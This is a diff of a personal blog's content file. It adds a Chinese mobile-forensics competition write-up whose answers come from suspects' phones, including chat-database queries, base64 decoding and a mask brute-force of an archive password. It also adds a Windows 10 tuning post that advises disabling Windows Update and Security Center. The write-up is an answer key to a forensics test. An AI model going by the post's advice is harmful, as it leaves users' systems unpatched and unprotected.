@@ -422,6 +422,157 @@
 <blockquote>
 <p>答案：H5CE4B30D</p>
 </blockquote>
+<h1 id="手机取证部分"><a href="#手机取证部分" class="headerlink" title="手机取证部分"></a>手机取证部分</h1><p>1、根据容恨寒的安卓手机分析，手机的蓝牙物理地址是[答案：B9:8B:35:8B:03:52] [★☆☆☆☆]</p>
+<p>手机取证系统直接看</p>
+<blockquote>
+<p>答案：A9:8B:34:8B:04:50</p>
+</blockquote>
+<p>2、根据容恨寒的安卓手机分析，SIM卡的ICCID是[答案：80891103212348510720] [★☆☆☆☆]</p>
+<p>手机取证系统直接看</p>
+<blockquote>
+<p>答案：89014103211118510720</p>
+</blockquote>
+<p>3、根据容恨寒的安卓手机分析，团队内部沟通的聊天工具程序名称是[答案：微信] [★☆☆☆☆]</p>
+<p>根据后面的题目，再数据库查找信息时确定的</p>
+<blockquote>
+<p>答案：Potato</p>
+</blockquote>
+<p>4、根据容恨寒的安卓手机分析，团队内部沟通容恨寒收到的最后一条聊天信息内容是[答案：好的] [★★★☆☆]</p>
+<p>首先找到包名为com.qim.imm的文件夹，文件夹下有数据库文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/data/data/com.qim.imm/databases/im_db_225_18969939616_8AF2C81F-58C2-8459-C492-9C4F65E6BC1E.db</span><br></pre></td></tr></table></figure>
+
+<p>我的需要从本地文件中导出使用，挂载起手机取证分析系统后，导出就没有这个目录</p>
+<p>之后用SQL数据库软件导入表</p>
+<p>使用语句直接查询</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TONAME,<span class="type">DATE</span>,BODY <span class="keyword">FROM</span> &quot;BAProvider$j&quot; <span class="keyword">WHERE</span> TONAME<span class="operator">=</span><span class="string">&#x27;容恨寒&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="type">DATE</span> <span class="keyword">DESC</span> LIMIT <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>得到BODY</p>
+<table>
+<thead>
+<tr>
+<th>DATE</th>
+<th>BODY</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1681302605884863</td>
+<td>PEJURj48Rm9udCBuYW1lPSJNaWNyb3NvZnQgWWFIZWkiIHNpemU9IjEwIiBmbGFncz0iMSIgLz48VGV4dD7lkI7pnaLlho3nu5nkvaDku6zmkJ48L1RleHQ+PC9CVEY+</td>
+</tr>
+</tbody></table>
+<p>BODY解密后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;BTF&gt;&lt;Font name=&quot;Microsoft YaHei&quot; size=&quot;10&quot; flags=&quot;1&quot; /&gt;&lt;Text&gt;后面再给你们搞&lt;/Text&gt;&lt;/BTF&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：后面再给你们搞</p>
+</blockquote>
+<p>5、根据容恨寒的安卓手机分析，收到的刷单.rar的MD5值是[答案：202cb962ac59075b964b07152d234b70] [★★☆☆☆]</p>
+<blockquote>
+<p>答案：dc52d8225fd328c592841cb1c3cd1761</p>
+</blockquote>
+<p>6、根据容恨寒的安卓手机分析，收到的刷单.rar的解压密码是[答案：abcdg@1234@hd] [★★★☆☆]</p>
+<p>在表中BAProvider$h</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">密码规则：</span><br><span class="line">前五位：wlzhg</span><br><span class="line">末尾两位：片区简写“xn”</span><br><span class="line">中间四位：0-9随机数组合</span><br><span class="line">各部分用@连接</span><br><span class="line">示例：wlzhg@8888@xn</span><br></pre></td></tr></table></figure>
+
+<p>使用Passware Kit Forensic进行掩码爆破</p>
+<p>自定义设置</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">字符长：13 to 13</span><br><span class="line">语言：English</span><br><span class="line">已知部分密码：wlzhg@*@xn</span><br><span class="line">选择：Number</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：wlzhg@3903@xn</p>
+</blockquote>
+<p>7、根据容恨寒的安卓手机分析，发送刷单.rar的用户的手机号是[答案：15137321234] [★★★★☆]</p>
+<p>将BAProbider$j与BAProbider$b数据进行base64解密</p>
+<p>在id为860C8E3C-3CA5-42C3-94B2-B5ECDF3B3FA1的一行上可以发现是发送了刷单.rar</p>
+<p>从而确定了用户为<code>德彦慧</code></p>
+<p>解密脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">base64_string</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(base64_string).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取Excel文件</span></span><br><span class="line">wb = openpyxl.load_workbook(<span class="string">&#x27;.xlsx&#x27;</span>)</span><br><span class="line">sheet = wb.active</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建新的工作簿</span></span><br><span class="line">new_wb = openpyxl.Workbook()</span><br><span class="line">new_sheet = new_wb.active</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历每个单元格</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> sheet.iter_rows(values_only=<span class="literal">True</span>):</span><br><span class="line">    new_row = []</span><br><span class="line">    <span class="keyword">for</span> idx, cell <span class="keyword">in</span> <span class="built_in">enumerate</span>(row):</span><br><span class="line">        <span class="comment"># 根据你需要解密的列数，如果是第八列（列索引为7）且单元格的数据是字符串</span></span><br><span class="line">        <span class="keyword">if</span> idx == <span class="number">2</span> <span class="keyword">and</span> <span class="built_in">isinstance</span>(cell, <span class="built_in">str</span>):</span><br><span class="line">            decoded_data = decode_base64(cell)</span><br><span class="line">            new_row.append(decoded_data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_row.append(cell)</span><br><span class="line">    </span><br><span class="line">    new_sheet.append(new_row)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存新的Excel文件</span></span><br><span class="line">new_wb.save(<span class="string">&#x27;.xlsx&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：15137326185</p>
+</blockquote>
+<p>8、根据容恨寒的安卓手机分析，发送多个报表的用户来自哪个部门[答案：理财部] [★★★★★]</p>
+<p>可以找到一个有相关部门的表。</p>
+<p>其实根据案件解析就知道有一名技术人员，估计属于技术部。</p>
+<p>正常做法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据将BAProbider$j与BAProbider$b数据进行关联，可以得到文件都是臧觅风发的</span><br><span class="line"></span><br><span class="line">在表o可以得到风的id为229，表k中技术部的id为109</span><br><span class="line"></span><br><span class="line">在表m中可以得知与109相关联的有228、229、230</span><br></pre></td></tr></table></figure>
+
+<p>所以风是来自技术部的</p>
+<blockquote>
+<p>答案：技术部</p>
+</blockquote>
+<p>9、根据容恨寒的安卓手机分析，MAC的开机密码是[答案：asdcz] [★☆☆☆☆]</p>
+<p>手机备忘录记事本</p>
+<blockquote>
+<p>答案：apple</p>
+</blockquote>
+<p>10、根据容恨寒的安卓手机分析，苹果手机的备份密码前4位是[答案：1234] [★☆☆☆☆]</p>
+<p>手机备忘录记事本</p>
+<blockquote>
+<p>答案：1976</p>
+</blockquote>
+<p>11、根据魏文茵苹果手机分析，IMEI号是？[答案格式:239471000325479] [★☆☆☆☆]</p>
+<p>设备信息</p>
+<blockquote>
+<p>答案：358360063200634</p>
+</blockquote>
+<p>12、根据魏文茵苹果手机分析，可能使用过的电话号码不包括？[答案格式:A] [★☆☆☆☆]</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A、18043618705</span><br><span class="line">B、19212175391</span><br><span class="line">C、19212159177</span><br><span class="line">D、18200532661</span><br></pre></td></tr></table></figure>
+
+<p>只有D没有搜索到</p>
+<blockquote>
+<p>答案：D</p>
+</blockquote>
+<p>13、根据臧觅风的安卓手机分析，微信ID是[答案：wxid_av7b3jbaaht123] [★☆☆☆☆]</p>
+<p>查看通讯工具微信，账号信息</p>
+<blockquote>
+<p>答案：wxid_kr7b3jbooht322</p>
+</blockquote>
+<p>14、根据臧觅风的安卓手机分析，在哪里使用过交友软件[答案：杭州] [★★★☆☆]</p>
+<p>就只有交友软件探探中给了地址西安，其他的没有</p>
+<blockquote>
+<p>答案：西安</p>
+</blockquote>
+<p>15、根据臧觅风的安卓手机分析，嫌疑人从哪个用户购买的源码，请给出出售源码方的账号[答案：1234524229] [★☆☆☆☆]</p>
+<p>在Telegram中发现</p>
+<p>在与ming chen的聊天记录中可以发现，就是在他这里购买的源码</p>
+<p>查看好友ming chen的信息</p>
+<blockquote>
+<p>答案：5768224669</p>
+</blockquote>
+<p>16、根据臧觅风的安卓手机分析，购买源码花了多少BTC？[答案：1.21] [★☆☆☆☆]</p>
+<p>与ming chen聊天记录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ming chen</span><br><span class="line">0.2BT</span><br><span class="line">后来讲价为</span><br><span class="line">0.08</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：0.08</p>
+</blockquote>
+<p>17、根据臧觅风的安卓手机分析，接收源码的邮箱是[答案：<a href="mailto:&#x61;&#115;&#100;&#97;&#115;&#100;&#x36;&#54;&#x36;&#x40;&#104;&#x6f;&#116;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#x61;&#115;&#100;&#97;&#115;&#100;&#x36;&#54;&#x36;&#x40;&#104;&#x6f;&#116;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;</a>] [★☆☆☆☆]</p>
+<p>还是聊天记录</p>
+<blockquote>
+<p>答案：<a href="mailto:&#x6d;&#x6f;&#108;&#105;&#104;&#117;&#97;&#x63;&#104;&#x61;&#48;&#48;&#55;&#x40;&#104;&#111;&#116;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#109;">&#x6d;&#x6f;&#108;&#105;&#104;&#117;&#97;&#x63;&#104;&#x61;&#48;&#48;&#55;&#x40;&#104;&#111;&#116;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#109;</a></p>
+</blockquote>
+<p>18、嫌疑人容恨寒苹果手机的IMEI是?[★★☆☆☆]</p>
+<p>直接查看备份文件中的info.plist文件，检索IMEI</p>
+<blockquote>
+<p>答案：353271073008914</p>
+</blockquote>
+<p>19、嫌疑人容恨寒苹果手机最后备份时间是?[答案格式:2000-01-01 13:36:25] [★★☆☆☆]</p>
+<p>在info文件中，存在值Last Backup Date，将值取出加上8就是答案</p>
+<blockquote>
+<p>答案：2023-04-12 21:20:59</p>
+</blockquote>
+<p>20、嫌疑人容恨寒苹果手机“易信”的唯一标识符（UUID）？[★★★★☆]</p>
+<p>直接去软件数据保存的地方找，一般以包名为命名的文件夹中包含许多相关信息，比如数据库，标识文件等</p>
+<p>在手机文件中找到/AppDomain-com.yixin.yixin/Documents/login_device_id_v1</p>
+<p>打开就看到</p>
+<blockquote>
+<p>答案：ec677dda-3387-4337-9b44-f7daae4fb29c</p>
+</blockquote>
+<p>21、嫌疑人容恨寒苹果手机微信ID是?[★☆☆☆☆]</p>
+<p>取证分析后直接查看微信账号信息</p>
+<blockquote>
+<p>答案：wxid_peshwv0rosih12</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>电子取证</category>
@@ -640,135 +791,46 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo搭建个人博客教程</title>
-    <url>/posts/6e27c1a7.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本站点是由<code>Hexo+Butterfly</code>主题搭建起来的，本文章就是想记录一下网站的搭建，以及整理一下自己的思路。希望能够给初手提供一些小小的帮助。</p>
-<h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><h2 id="搭建准备"><a href="#搭建准备" class="headerlink" title="搭建准备"></a>搭建准备</h2><p>1.基础软件与工具的安装</p>
-<ul>
-<li><a href="https://github.com/">GitHub</a></li>
-<li><a href="https://git-scm.com/">Git</a></li>
-<li><a href="https://hexo.io/zh-cn/">Hexo</a></li>
-<li><a href="https://nodejs.org/en/">Node.js</a></li>
-</ul>
-<p><strong>Node安装</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官网下载，具体安装教程借鉴：https://blog.csdn.net/web18224617243/article/details/123191441</span><br></pre></td></tr></table></figure>
+    <title>Win10使用优化</title>
+    <url>/posts/f970716d.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下在win10的 游荡历程，保护一下个人隐私，简化使用，炫酷的大爷可以绕过，希望给各位大爷提供带点有用帮助。勿喷</p>
+<h1 id="关闭自动更新"><a href="#关闭自动更新" class="headerlink" title="关闭自动更新"></a>关闭自动更新</h1><p>相对旧机子，更新后的系统可能会影响电脑的使用体验，所以建议关闭自动更新，当你想更新时子再更新</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.右键&quot;此电脑&quot;，选择&quot;管理&quot;。</span><br><span class="line">2.选择&quot;服务和应用程序=&gt;服务&quot;、然后找到&quot;Windows Update&quot;双击打开 （这里是用名称排序的，从W开始找比较快。）</span><br><span class="line">3.在&quot;常规&quot;选项卡下，把启动类型改为 &quot;禁用&quot;。</span><br><span class="line">4.点击&quot;恢复&quot;选项卡，将&quot;第一次失败&quot;、&quot;第二次失败&quot;、&quot;后续失败&quot;都改为&quot;无操作&quot;，然后点击&quot;确定&quot;（这步非常重要，否则自动更新还会自动开启。</span><br></pre></td></tr></table></figure>
 
-<p><strong>Git安装</strong></p>
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">去官网下载，具有安装教程借鉴：</span><br><span class="line">https://blog.csdn.net/mukes/article/details/115693833</span><br></pre></td></tr></table></figure>
+<p><strong>关闭计划任务</strong></p>
+<p>在桌面找到<strong>我的电脑</strong>，右键<strong>管理，</strong>然后依次点击<strong>系统工具，任务计划程序，任务计划程序库，microsoft，windows，windows update，将里面的选项都右键</strong>禁用。</p>
+<h1 id="关闭最近使用文件"><a href="#关闭最近使用文件" class="headerlink" title="关闭最近使用文件"></a>关闭最近使用文件</h1><p>步骤如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开此电脑</span><br><span class="line">切换到选项卡，点击进入</span><br><span class="line">在常规下，隐私内关闭即可</span><br></pre></td></tr></table></figure>
 
-<p><strong>Hexo安装</strong></p>
-<p>安装<strong>Hexo</strong>，在<strong>Git Bash</strong>中执行以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+<h1 id="关闭win10一些服务"><a href="#关闭win10一些服务" class="headerlink" title="关闭win10一些服务"></a>关闭win10一些服务</h1><p>在桌面上找到 此电脑 右键—-管理 点击。</p>
+<p>然后如图所示，点开服务。</p>
+<p><strong>关闭并禁用这些服务</strong></p>
+<p><strong>Connected User Experiences and Telemetry</strong></p>
+<p>一个微软操作系统外围辅助服务。这项服务除了收集数据之外，还兼有收集错误和崩溃信息的职责，因此对于微软改进系统也有重要的意义。如果你不介意微软收集这些信息，可以保持服务的开启状态。</p>
+<p><strong>Diagnostic Execution Service</strong></p>
+<p>系统诊断执行服务 没什么卵用</p>
+<p><strong>HomeGroup Listener和HomeGroupProvider</strong></p>
+<p>家庭组服务，没什么卵用.</p>
+<p><strong>windows server</strong></p>
+<p>如果不经常使用系统搜索就关闭它</p>
+<p><strong>Program CompatibilityAssistant Service</strong></p>
+<p>兼容助手服务，</p>
+<p><strong>SecurityCenter</strong></p>
+<p>安全中心服务，直接禁用</p>
+<p><strong>SysMain</strong></p>
+<p>这个服务如果电脑上全部都是固态，可以关闭，要是有机械的话，有一定的作用。</p>
+<p>以上服务全部禁用。</p>
+<h1 id="关闭系统界面特效，优化系统性能"><a href="#关闭系统界面特效，优化系统性能" class="headerlink" title="关闭系统界面特效，优化系统性能"></a><strong>关闭系统界面特效，优化系统性能</strong></h1><p>如果选择 最佳性能的话，字体比较难看，看的不习惯，勾选 平滑字体边缘。其他的根据自己需要勾选，不在乎字体的话，直接 最佳性能</p>
+<p>只勾选：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">平滑滚动列表框</span><br><span class="line">平滑屏幕字体边缘</span><br><span class="line">启用速览</span><br></pre></td></tr></table></figure>
 
-<p>创建一个新目录，我的是<code>D:\program\blog</code>，并且执行初始化：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init Blog</span><br><span class="line">或</span><br><span class="line">cd Blog &amp;&amp; hexo init</span><br></pre></td></tr></table></figure>
-
-<p>2.本地搭建</p>
-<p>先后执行下面命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
-
-<p>访问默认地址 <strong><a href="http://localhosy:4000/">http://localhosy:4000</a></strong> 就可以查看到搭建起来的博客，<strong>Ctrl+C</strong>就可以停止服务。</p>
-<p>如果4000端口被占用，使用以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s -p 5000 （端口自定义）</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><ol>
-<li><p>在GitHub上新建一个仓，仓库与你的用户名相同，仓要公开。</p>
-<p>注意： 仓库名称的<strong>前半部分与你的用户名一致</strong>，即 lummod，<strong>后半部分为 yourname.git.io 固定格式</strong>（忽略红色警告，因为我已经创建过了！），可以选择一个readme为说明文件（随便），然后<strong>点击创建仓库</strong></p>
-</li>
-<li><p>在博客目录下，执行以下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm insatll -g hexo-cli</span><br><span class="line">hexo init （如果前面初始化和安装过就不用了）</span><br></pre></td></tr></table></figure></li>
-<li><p>绑定GitHub，添加SSH key，命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot;</span><br></pre></td></tr></table></figure>
-
-<p>添加到 GitHub ，复制密钥文件内容（路径如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>），粘贴到 <a href="https://github.com/settings/keys">New SSH Key</a>即可。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">yes</span><br></pre></td></tr></table></figure>
-
-<p>接着输入命令连接：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">yes</span><br></pre></td></tr></table></figure>
-
-<p>测试，如果回显返回“You’ve successfully authenticated”即成功。</p>
-</li>
-<li><p>打开根目录下的_config.yml，写入：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/fengye97/fengye97.github.io.git  #你的仓库地址</span><br><span class="line">  branch: master 你的目录 </span><br><span class="line">  #ps: 要注意空格</span><br></pre></td></tr></table></figure></li>
-<li><p>安装Git部属插件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">日常三连: hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
-
-<p>如果成功，输入github域名即可进入</p>
-</li>
-</ol>
-<h2 id="解析域名"><a href="#解析域名" class="headerlink" title="解析域名"></a>解析域名</h2><p>本步骤需要购买域名，我用的是阿里云，所以就以阿里云为例。</p>
-<p>第一步：在阿里云控制台中，点击解析并添加两条解析记录</p>
-<ol>
-<li><p>添加 CNAME 记录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类型选择为 CNAME；</span><br><span class="line"></span><br><span class="line">主机记录即域名前缀为www；</span><br><span class="line"></span><br><span class="line">记录值填写为yourname.github.io；</span><br><span class="line"></span><br><span class="line">解析线路，TTL 默认即可。</span><br></pre></td></tr></table></figure></li>
-<li><p>添加 两条A 记录指向 192.30.252.153和192.30.252.154</p>
-<p>类型选择为 A；</p>
-<p>主机记录即域名前缀，填写为@；</p>
-<p>记录值填写为192.30.252.153和192.30.252.154；</p>
-<p>解析线路，境外或谷歌。</p>
-</li>
-</ol>
-<p>A记录类型的记录值为<strong>IPV4</strong>地址，通过ping域名得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping zhou-boop.github.io    #ping + 你的GitHub的网址</span><br></pre></td></tr></table></figure>
-
-<p>第二步：在根目录下的 <strong>source</strong> 文件中新建 <strong>CNAME</strong> 文件，文件中写入你的域名(购买的)，不要加上www。</p>
-<p>第三步：重新部署一下</p>
-<p>在 <strong>Github</strong> 查看 <strong>CNAME</strong> 文件以及网址。</p>
-<p>输入域名就可以直接登录网站了。</p>
-<h1 id="博客配置"><a href="#博客配置" class="headerlink" title="博客配置"></a>博客配置</h1><h2 id="Hexo-博客生成永久链接"><a href="#Hexo-博客生成永久链接" class="headerlink" title="Hexo 博客生成永久链接"></a>Hexo 博客生成永久链接</h2><p>Hexo 文章链接默认的生成规则是：<code>:year/:month/:day/:title</code>，是按照年、月、日、标题来生成的。</p>
-<p>修改链接有助于别人记录，方便自己随时修改文章的内容，只要不改变 footer-matter 中的 id 值，那么文章链接永远不会变。</p>
-<p><strong>安装插件</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>
-
-<p><strong>修改配置文件</strong></p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## permalink: :year/:month/:day/:title/</span></span><br><span class="line"><span class="comment">## 此处可以自己设置</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink/</span> </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span></span><br></pre></td></tr></table></figure>
-
-<p>在文件中增加配置</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># abbrlink config</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc32</span>      <span class="comment">#support crc16(default) and crc32</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">hex</span>        <span class="comment">#support dec(default) and hex</span></span><br><span class="line">  <span class="attr">drafts:</span> <span class="literal">false</span>   <span class="comment">#(true)处理草稿,(false)不处理草稿. false(default) </span></span><br><span class="line">  <span class="comment"># 从目录树生成类别</span></span><br><span class="line">  <span class="comment"># depth: 要生成的目录树的最大深度，应该&gt; 0</span></span><br><span class="line">  <span class="attr">auto_category:</span></span><br><span class="line">     <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment">#true(default)</span></span><br><span class="line">     <span class="attr">depth:</span>        <span class="comment">#3(default)</span></span><br><span class="line">     <span class="attr">over_write:</span> <span class="literal">false</span> </span><br><span class="line">  <span class="attr">auto_title:</span> <span class="literal">false</span> <span class="comment">#启用自动标题，它可以根据路径自动填充标题</span></span><br><span class="line">  <span class="attr">auto_date:</span> <span class="literal">false</span> <span class="comment">#启用自动日期，它可以根据今天的时间自动填充日期</span></span><br><span class="line">  <span class="attr">force:</span> <span class="literal">false</span> <span class="comment">#启用强制模式，在这种模式下，插件将忽略缓存，并为每个帖子计算缩写链接，即使它已经有缩写链接。 这只会更新 abbrlink 而不是其他前面的变量。</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>样式</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crc16 &amp; hex</span><br><span class="line">https://post.zz173.com/posts/66c8.html</span><br><span class="line"></span><br><span class="line">crc16 &amp; dec</span><br><span class="line">https://post.zz173.com/posts/65535.html</span><br><span class="line">#32</span><br><span class="line">crc32 &amp; hex</span><br><span class="line">https://post.zz173.com/posts/8ddf18fb.html</span><br><span class="line"></span><br><span class="line">crc32 &amp; dec</span><br><span class="line">https://post.zz173.com/posts/1690090958.html</span><br></pre></td></tr></table></figure>
-
-
-
-<blockquote>
-<p>github地址：<a href="https://github.com/Rozbo/hexo-abbrlink">hexo-abbrlink</a></p>
-</blockquote>
-<h2 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h2><p>主题配置文件，关键字：<strong>menu</strong>，删除前面的注释就可以启用</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="comment">#about: /about/ || fa fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">/resources/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-download</span>   <span class="comment">#资源</span></span><br><span class="line">  <span class="attr">tools:</span> <span class="string">/tools/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-briefcase</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable / Disable menu icons / item badges.</span></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>“||”前面是目标链接，后面是图标名称，主题使用图标来自<a href="http://www.fontawesome.com.cn/faicons/#web-application">图标库 - Font Awesome 中文网</a>，可以自己搜索图标使用</p>
-<p>新添加的菜单需要翻译对应的中文，打开theme/next/languages/zh-CN.yml，在menu下设置：</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">关于</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">资源</span></span><br><span class="line">  <span class="attr">search:</span> <span class="string">搜索</span></span><br></pre></td></tr></table></figure>
-
-<p>在根目录下，执行如下命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;resources&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>在根目录sources文件夹下会生成categories、tags、about、resources四个文件，每个文件中有一个<code>index.md</code>文件，修改内容分别如下：</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">#例子</span></span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-06-29 11:35:42   # 时间随意</span><br><span class="line">type: &quot;tags&quot;                # 类型一定要为tags</span><br><span class="line">comments: false             # 提示这个页面不需要加载评论</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="主题配置优化"><a href="#主题配置优化" class="headerlink" title="主题配置优化"></a>主题配置优化</h1><p>我选butterfly的主题，所以主题是针对这个主题的，不一定适用其他主题</p>
-<h2 id="butterfly主题文章双栏布局插件"><a href="#butterfly主题文章双栏布局插件" class="headerlink" title="butterfly主题文章双栏布局插件"></a>butterfly主题文章双栏布局插件</h2><p><strong>NPM 插件安装的部署方法：</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-butterfly-article-double-row --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"></span><br><span class="line">cnpm i hexo-butterfly-article-double-row --save</span><br></pre></td></tr></table></figure>
-
-<p>注意，一定要加<code>--save</code>，不然本地预览的时候可能不会显示！！！</p>
-<p><strong>新增配置</strong></p>
-<p>是网站根目录下的配置文件_config</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">butterfly_article_double_row:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>然后素质三连。</p>
-<h2 id="Butterfly添加顶部加载进度条"><a href="#Butterfly添加顶部加载进度条" class="headerlink" title="Butterfly添加顶部加载进度条"></a>Butterfly添加顶部加载进度条</h2><p>我使用的是4.7.0版本，版本已经集成了，在配置文件中直接修改就好。</p>
